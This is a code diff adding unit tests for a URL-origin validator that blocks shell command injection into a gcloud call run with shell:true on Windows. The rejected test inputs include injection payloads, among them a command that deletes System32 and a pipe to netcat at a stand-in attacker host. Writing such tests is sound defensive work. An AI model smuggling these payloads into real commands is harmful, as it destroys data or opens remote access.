@@ -36,7 +36,8 @@ import {
   decodeJwtPayloadNoVerify,
   handleMessage,
   extractSseJson,
-  execGcloud
+  execGcloud,
+  validateAudience
 } from '../src/index.js';
 
 import { assertNode24 } from '../src/version-check.js';
@@ -1236,5 +1237,137 @@ describe('execGcloud — Windows spawn EINVAL fix', () => {
     await execGcloud(['auth', 'list'], { execFn: fakeExec });
     const expectedShell = process.platform === 'win32' ? true : undefined;
     assert.strictEqual(captured.shell, expectedShell);
+  });
+});
+
+// ── validateAudience — load-bearing safety boundary for shell:true ──────────
+//
+// The execGcloud shell:true workaround for CVE-2024-27980 (Windows .cmd
+// rejection) is safe ONLY because every templated arg value is validated
+// upstream. validateAudience() is that validation for `--audiences=<value>`,
+// the one non-literal value execGcloud receives. These tests lock the
+// validation contract: malformed URLs, non-origin URLs, and shell-metachar
+// payloads must all reject; legitimate origin URLs must pass.
+
+describe('validateAudience — origin + no-metachars contract', () => {
+  test('accepts canonical Hafla origin', () => {
+    assert.strictEqual(
+      validateAudience('https://mcp.hafla.com'),
+      'https://mcp.hafla.com'
+    );
+  });
+
+  test('accepts trailing slash (pathname "/" is treated as origin)', () => {
+    assert.strictEqual(
+      validateAudience('https://mcp.hafla.com/'),
+      'https://mcp.hafla.com'
+    );
+  });
+
+  test('accepts localhost with explicit port (dev case)', () => {
+    assert.strictEqual(
+      validateAudience('http://localhost:8080'),
+      'http://localhost:8080'
+    );
+  });
+
+  test('rejects unparseable garbage', () => {
+    assert.throws(
+      () => validateAudience('not a url at all'),
+      /could not parse as URL/
+    );
+  });
+
+  test('rejects audience with path component', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com/mcp'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with query string', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com?x=1'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with fragment', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com#frag'),
+      /must be origin-only/
+    );
+  });
+
+  test('rejects audience with userinfo', () => {
+    assert.throws(
+      () => validateAudience('https://user@mcp.hafla.com'),
+      /must be origin-only/
+    );
+  });
+
+  // ── The injection cases that motivate this validation ─────────────────
+
+  test('rejects cmd.exe & (command separator)', () => {
+    // The classic injection payload: GATEWAY_AUDIENCE="https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32"
+    // Without validation + shell:true on Windows, this would execute rmdir
+    // when --audiences=<value> is concatenated into the cmd.exe command line.
+    assert.throws(
+      () =>
+        validateAudience(
+          'https://mcp.hafla.com&rmdir /s /q C:\\Windows\\System32'
+        ),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects cmd.exe | (pipe)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com|nc evil.example.com 4444'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects cmd.exe % (env var expansion)', () => {
+    // %USERPROFILE% would expand to the user's profile path under cmd.exe.
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com%USERPROFILE%'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects POSIX $(...) command substitution', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com$(whoami)'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects POSIX backtick command substitution', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com`whoami`'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects output redirection >', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com>out.txt'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects input redirection <', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com<input.txt'),
+      /shell metacharacters|could not parse/
+    );
+  });
+
+  test('rejects cmd.exe ^ (escape)', () => {
+    assert.throws(
+      () => validateAudience('https://mcp.hafla.com^&malicious'),
+      /shell metacharacters|could not parse/
+    );
   });
 });
